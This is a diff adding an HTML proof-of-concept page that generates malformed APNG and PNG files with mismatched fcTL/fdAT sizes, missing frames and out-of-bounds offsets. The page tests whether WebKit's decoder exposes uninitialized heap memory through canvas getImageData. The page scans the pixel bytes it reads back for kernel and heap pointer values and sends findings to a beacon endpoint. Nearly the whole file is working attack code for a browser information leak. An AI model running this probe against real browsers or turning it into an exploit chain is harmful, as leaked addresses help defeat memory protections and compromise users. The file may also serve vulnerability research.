@@ -1,0 +1,431 @@
+<!--
+  p657: APNG overread heap address leak test
+
+  HYPOTHESIS: Malformed APNG frames may cause WebKit's PNG decoder to
+  expose uninitialized heap memory as pixel data. If the decoder
+  allocates a buffer for frame N's dimensions but doesn't fully fill it
+  (due to mismatched fcTL/fdAT sizes), the unfilled bytes contain heap
+  residue readable via getImageData().
+
+  Test variants:
+    A) fcTL declares 200x1 frame, fdAT contains 1x1 pixel data
+    B) fcTL declares 48x1 frame, fdAT contains 1x1 pixel data
+    C) IHDR 200x1, single IDAT with 1x1 compressed data
+    D) Frame 2 missing fdAT entirely (only acTL + fcTL)
+    E) Normal APNG baseline (should be all zeros)
+
+  For each: load Image, draw to canvas, getImageData, scan for non-zero
+  bytes in the overread region. Non-zero bytes = heap residue = info leak.
+
+  CRASH_CLASS: LOW (passive image decode, no code execution)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p657</title></head>
+<body>p657: APNG overread
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P657-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+function hex8(v) { return ('00' + (v & 0xFF).toString(16)).slice(-2); }
+
+emit('START', 'v1-apng-overread');
+flush();
+
+// --- PNG construction helpers ---
+function crc32(buf, off, len) {
+  var table = [];
+  for (var n = 0; n < 256; n++) {
+    var c = n;
+    for (var k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+    table[n] = c;
+  }
+  var crc = 0xFFFFFFFF;
+  for (var i = off; i < off + len; i++) crc = table[(crc ^ buf[i]) & 0xFF] ^ (crc >>> 8);
+  return (crc ^ 0xFFFFFFFF) >>> 0;
+}
+
+function adler32(data) {
+  var a = 1, b = 0;
+  for (var i = 0; i < data.length; i++) {
+    a = (a + data[i]) % 65521;
+    b = (b + a) % 65521;
+  }
+  return ((b << 16) | a) >>> 0;
+}
+
+function makeChunk(type, data) {
+  var len = data.length;
+  var chunk = new Uint8Array(12 + len);
+  var dv = new DataView(chunk.buffer);
+  dv.setUint32(0, len, false); // big-endian length
+  chunk[4] = type.charCodeAt(0);
+  chunk[5] = type.charCodeAt(1);
+  chunk[6] = type.charCodeAt(2);
+  chunk[7] = type.charCodeAt(3);
+  chunk.set(data, 8);
+  var crc = crc32(chunk, 4, 4 + len);
+  dv.setUint32(8 + len, crc, false);
+  return chunk;
+}
+
+function deflateStored(raw) {
+  // Minimal zlib: header + stored deflate block + adler32
+  var out = new Uint8Array(2 + 5 + raw.length + 4);
+  out[0] = 0x78; out[1] = 0x01; // zlib header (CMF=0x78, FLG=0x01)
+  out[2] = 0x01; // BFINAL=1, BTYPE=00 (stored)
+  out[3] = raw.length & 0xFF;
+  out[4] = (raw.length >> 8) & 0xFF;
+  out[5] = (~raw.length) & 0xFF;
+  out[6] = (~raw.length >> 8) & 0xFF;
+  out.set(raw, 7);
+  var adl = adler32(raw);
+  var off = 7 + raw.length;
+  out[off] = (adl >> 24) & 0xFF;
+  out[off+1] = (adl >> 16) & 0xFF;
+  out[off+2] = (adl >> 8) & 0xFF;
+  out[off+3] = adl & 0xFF;
+  return out;
+}
+
+function makeIHDR(w, h) {
+  var d = new Uint8Array(13);
+  var dv = new DataView(d.buffer);
+  dv.setUint32(0, w, false);
+  dv.setUint32(4, h, false);
+  d[8] = 8;  // bit depth
+  d[9] = 6;  // RGBA
+  d[10] = 0; // compression
+  d[11] = 0; // filter
+  d[12] = 0; // interlace
+  return makeChunk('IHDR', d);
+}
+
+function makeACTL(numFrames, numPlays) {
+  var d = new Uint8Array(8);
+  var dv = new DataView(d.buffer);
+  dv.setUint32(0, numFrames, false);
+  dv.setUint32(4, numPlays, false);
+  return makeChunk('acTL', d);
+}
+
+var seqNum = 0;
+function makeFCTL(w, h, xOff, yOff, delayNum, delayDen, dispose, blend) {
+  var d = new Uint8Array(26);
+  var dv = new DataView(d.buffer);
+  dv.setUint32(0, seqNum++, false);
+  dv.setUint32(4, w, false);
+  dv.setUint32(8, h, false);
+  dv.setUint32(12, xOff, false);
+  dv.setUint32(16, yOff, false);
+  dv.setUint16(20, delayNum, false);
+  dv.setUint16(22, delayDen || 100, false);
+  d[24] = dispose || 0;
+  d[25] = blend || 0;
+  return makeChunk('fcTL', d);
+}
+
+function makeRawPixels(w, h) {
+  // Generate raw PNG row data: filter_byte(0) + RGBA per pixel, per row
+  var raw = new Uint8Array(h * (1 + w * 4));
+  for (var y = 0; y < h; y++) {
+    raw[y * (1 + w * 4)] = 0; // no filter
+    for (var x = 0; x < w; x++) {
+      var off = y * (1 + w * 4) + 1 + x * 4;
+      raw[off] = 0xFF;     // R
+      raw[off+1] = 0x00;   // G
+      raw[off+2] = 0x00;   // B
+      raw[off+3] = 0xFF;   // A (red pixel)
+    }
+  }
+  return raw;
+}
+
+function makeIDAT(w, h) {
+  return makeChunk('IDAT', deflateStored(makeRawPixels(w, h)));
+}
+
+function makeFDAT(w, h) {
+  var raw = makeRawPixels(w, h);
+  var compressed = deflateStored(raw);
+  var d = new Uint8Array(4 + compressed.length);
+  var dv = new DataView(d.buffer);
+  dv.setUint32(0, seqNum++, false);
+  d.set(compressed, 4);
+  return makeChunk('fdAT', d);
+}
+
+function makeIEND() {
+  return makeChunk('IEND', new Uint8Array(0));
+}
+
+var PNG_SIG = new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]);
+
+function concatArrays(arrays) {
+  var total = 0;
+  for (var i = 0; i < arrays.length; i++) total += arrays[i].length;
+  var result = new Uint8Array(total);
+  var off = 0;
+  for (var i = 0; i < arrays.length; i++) {
+    result.set(arrays[i], off);
+    off += arrays[i].length;
+  }
+  return result;
+}
+
+function makeBlobURL(data) {
+  return URL.createObjectURL(new Blob([data], { type: 'image/png' }));
+}
+
+// --- Test variants ---
+var tests = [];
+
+// Variant A: APNG 200x1, frame 1 = 200x1 IDAT (valid), frame 2 fcTL=200x1 but fdAT=1x1
+function makeVariantA() {
+  seqNum = 0;
+  var ihdr = makeIHDR(200, 1);
+  var actl = makeACTL(2, 0);
+  var fctl1 = makeFCTL(200, 1, 0, 0, 10, 100, 0, 0);
+  var idat = makeIDAT(200, 1);
+  var fctl2 = makeFCTL(200, 1, 0, 0, 10, 100, 0, 0);
+  var fdat2 = makeFDAT(1, 1); // only 1x1 pixel data, but fcTL says 200x1
+  return concatArrays([PNG_SIG, ihdr, actl, fctl1, idat, fctl2, fdat2, makeIEND()]);
+}
+
+// Variant B: APNG 48x1, frame 2 fcTL=48x1 but fdAT=1x1
+function makeVariantB() {
+  seqNum = 0;
+  var ihdr = makeIHDR(48, 1);
+  var actl = makeACTL(2, 0);
+  var fctl1 = makeFCTL(48, 1, 0, 0, 10, 100, 0, 0);
+  var idat = makeIDAT(48, 1);
+  var fctl2 = makeFCTL(48, 1, 0, 0, 10, 100, 0, 0);
+  var fdat2 = makeFDAT(1, 1);
+  return concatArrays([PNG_SIG, ihdr, actl, fctl1, idat, fctl2, fdat2, makeIEND()]);
+}
+
+// Variant C: Standard PNG 200x1 IHDR but IDAT has only 1x1 data (not APNG)
+function makeVariantC() {
+  seqNum = 0;
+  var ihdr = makeIHDR(200, 1);
+  var idat = makeIDAT(1, 1); // 1x1 data in 200x1 declared image
+  return concatArrays([PNG_SIG, ihdr, idat, makeIEND()]);
+}
+
+// Variant D: APNG with frame 2 fcTL but NO fdAT
+function makeVariantD() {
+  seqNum = 0;
+  var ihdr = makeIHDR(48, 1);
+  var actl = makeACTL(2, 0);
+  var fctl1 = makeFCTL(48, 1, 0, 0, 10, 100, 0, 0);
+  var idat = makeIDAT(48, 1);
+  var fctl2 = makeFCTL(48, 1, 0, 0, 10, 100, 0, 0);
+  // No fdAT for frame 2!
+  return concatArrays([PNG_SIG, ihdr, actl, fctl1, idat, fctl2, makeIEND()]);
+}
+
+// Variant E: Valid APNG baseline (both frames match)
+function makeVariantE() {
+  seqNum = 0;
+  var ihdr = makeIHDR(48, 1);
+  var actl = makeACTL(2, 0);
+  var fctl1 = makeFCTL(48, 1, 0, 0, 10, 100, 0, 0);
+  var idat = makeIDAT(48, 1);
+  var fctl2 = makeFCTL(48, 1, 0, 0, 10, 100, 0, 0);
+  var fdat2 = makeFDAT(48, 1); // correct: 48x1
+  return concatArrays([PNG_SIG, ihdr, actl, fctl1, idat, fctl2, fdat2, makeIEND()]);
+}
+
+// Variant F: Large APNG overread — fcTL frame 2 offset pushes past IHDR bounds
+function makeVariantF() {
+  seqNum = 0;
+  var ihdr = makeIHDR(48, 1);
+  var actl = makeACTL(2, 0);
+  var fctl1 = makeFCTL(48, 1, 0, 0, 10, 100, 0, 0);
+  var idat = makeIDAT(48, 1);
+  // Frame 2: x_offset=40, width=48 → extends 40 pixels past IHDR.width
+  var fctl2 = makeFCTL(48, 1, 40, 0, 10, 100, 0, 0);
+  var fdat2 = makeFDAT(48, 1);
+  return concatArrays([PNG_SIG, ihdr, actl, fctl1, idat, fctl2, fdat2, makeIEND()]);
+}
+
+// Variant G: tEXt chunk with padding after IDAT (non-APNG overread via chunk misparse)
+function makeVariantG() {
+  seqNum = 0;
+  var ihdr = makeIHDR(48, 1);
+  var idat = makeIDAT(48, 1);
+  // Add a large tEXt chunk — shouldn't affect pixels but tests parser
+  var textData = new Uint8Array(512);
+  for (var i = 0; i < 512; i++) textData[i] = 0x41; // 'A' fill
+  var text = makeChunk('tEXt', textData);
+  return concatArrays([PNG_SIG, ihdr, idat, text, makeIEND()]);
+}
+
+tests.push({ name: 'A-fcTL200-fdAT1', data: makeVariantA(), w: 200, h: 1 });
+tests.push({ name: 'B-fcTL48-fdAT1', data: makeVariantB(), w: 48, h: 1 });
+tests.push({ name: 'C-IHDR200-IDAT1', data: makeVariantC(), w: 200, h: 1 });
+tests.push({ name: 'D-noFDAT', data: makeVariantD(), w: 48, h: 1 });
+tests.push({ name: 'E-baseline', data: makeVariantE(), w: 48, h: 1 });
+tests.push({ name: 'F-offset-oob', data: makeVariantF(), w: 48, h: 1 });
+tests.push({ name: 'G-tEXt-pad', data: makeVariantG(), w: 48, h: 1 });
+
+emit('TESTS', tests.length + ' variants built');
+flush();
+
+var testIdx = 0;
+
+function runNext() {
+  if (testIdx >= tests.length) {
+    emit('DONE', 'all variants tested');
+    flush();
+    return;
+  }
+
+  var t = tests[testIdx];
+  testIdx++;
+
+  var url = makeBlobURL(t.data);
+  var img = new Image();
+  var timeout = setTimeout(function() {
+    emit(t.name, 'TIMEOUT');
+    flush();
+    URL.revokeObjectURL(url);
+    runNext();
+  }, 3000);
+
+  img.onload = function() {
+    clearTimeout(timeout);
+    try {
+      var c = document.createElement('canvas');
+      c.width = t.w;
+      c.height = t.h;
+      var ctx = c.getContext('2d');
+      ctx.drawImage(img, 0, 0);
+      var id = ctx.getImageData(0, 0, t.w, t.h);
+      var d = id.data;
+
+      // Scan for non-zero bytes
+      var nonZero = 0;
+      var firstNZ = -1;
+      var kptrs = [];
+      var heapPtrs = [];
+
+      for (var i = 0; i < d.length; i++) {
+        if (d[i] !== 0) {
+          nonZero++;
+          if (firstNZ < 0) firstNZ = i;
+        }
+      }
+
+      // Scan for pointer-shaped values (8-byte aligned qwords)
+      for (var i = 0; i + 7 < d.length; i += 4) {
+        var lo = d[i] | (d[i+1] << 8) | (d[i+2] << 16) | (d[i+3] << 24);
+        var hi = 0;
+        if (i + 7 < d.length) {
+          hi = d[i+4] | (d[i+5] << 8) | (d[i+6] << 16) | (d[i+7] << 24);
+        }
+        hi = hi >>> 0;
+        // Kernel pointer: hi >= 0xFFFF8000
+        if (hi >= 0xFFFF8000 && hi !== 0xFFFFFFFF) {
+          kptrs.push('+' + i.toString(16) + '=' + hex32(hi) + hex32(lo >>> 0));
+        }
+        // Heap pointer: hi in 0x00000010..0x00001000 range
+        if (hi >= 0x10 && hi < 0x1000 && lo !== 0) {
+          heapPtrs.push('+' + i.toString(16) + '=' + hex32(hi) + hex32(lo >>> 0));
+        }
+      }
+
+      // Expected non-zero: red pixels (0xFF,0x00,0x00,0xFF per pixel for frame 1)
+      // Anything BEYOND the expected red pixels is potential heap residue
+      var expectedNZ = 0;
+      if (t.name === 'E-baseline' || t.name === 'G-tEXt-pad') {
+        expectedNZ = t.w * t.h * 2; // R and A channels for red pixels
+      } else if (t.name.indexOf('fcTL') >= 0 || t.name.indexOf('offset') >= 0) {
+        // Frame 1 has red pixels, frame 2 might overread
+        expectedNZ = t.w * 2; // frame 1 red pixels
+      }
+
+      emit(t.name, 'loaded ' + t.w + 'x' + t.h + ' nz=' + nonZero + ' first=' + firstNZ);
+
+      // Dump first 32 bytes and last 32 bytes as hex
+      var hexFirst = '';
+      for (var i = 0; i < Math.min(32, d.length); i++) hexFirst += hex8(d[i]);
+      emit(t.name + '-HEAD', hexFirst);
+
+      if (d.length > 32) {
+        var hexLast = '';
+        var start = d.length - 32;
+        for (var i = start; i < d.length; i++) hexLast += hex8(d[i]);
+        emit(t.name + '-TAIL', 'from+' + start.toString(16) + ': ' + hexLast);
+      }
+
+      if (kptrs.length > 0) {
+        emit(t.name + '-KPTR', kptrs.length + ' kernel: ' + kptrs.slice(0, 5).join(' '));
+      }
+      if (heapPtrs.length > 0) {
+        emit(t.name + '-HEAP', heapPtrs.length + ' heap: ' + heapPtrs.slice(0, 5).join(' '));
+      }
+
+      // Detailed scan: count by region
+      // Region 0: first pixel (should be red if frame 1 renders)
+      // Region 1: past first pixel (overread zone)
+      if (t.w > 1) {
+        var r0nz = 0, r1nz = 0;
+        for (var i = 0; i < 4; i++) if (d[i] !== 0) r0nz++;
+        for (var i = 4; i < d.length; i++) if (d[i] !== 0) r1nz++;
+        emit(t.name + '-ZONE', 'pixel0-nz=' + r0nz + ' rest-nz=' + r1nz);
+
+        // If rest has non-zero AND it's not just expected red pixels
+        if (r1nz > 0 && t.name !== 'E-baseline' && t.name !== 'G-tEXt-pad') {
+          // Dump interesting bytes
+          var interesting = [];
+          for (var i = 4; i < Math.min(200, d.length); i++) {
+            if (d[i] !== 0 && d[i] !== 0xFF) {
+              interesting.push('+' + i.toString(16) + '=' + hex8(d[i]));
+            }
+          }
+          if (interesting.length > 0) {
+            emit(t.name + '-LEAK', interesting.slice(0, 20).join(' '));
+          }
+        }
+      }
+
+    } catch(e) {
+      emit(t.name, 'draw-err: ' + String(e).slice(0, 80));
+    }
+    flush();
+    URL.revokeObjectURL(url);
+    setTimeout(runNext, 100);
+  };
+
+  img.onerror = function() {
+    clearTimeout(timeout);
+    emit(t.name, 'LOAD-ERROR (decoder rejected)');
+    flush();
+    URL.revokeObjectURL(url);
+    setTimeout(runNext, 100);
+  };
+
+  img.src = url;
+}
+
+setTimeout(runNext, 50);
+
+})();
+</script>
+</body></html>
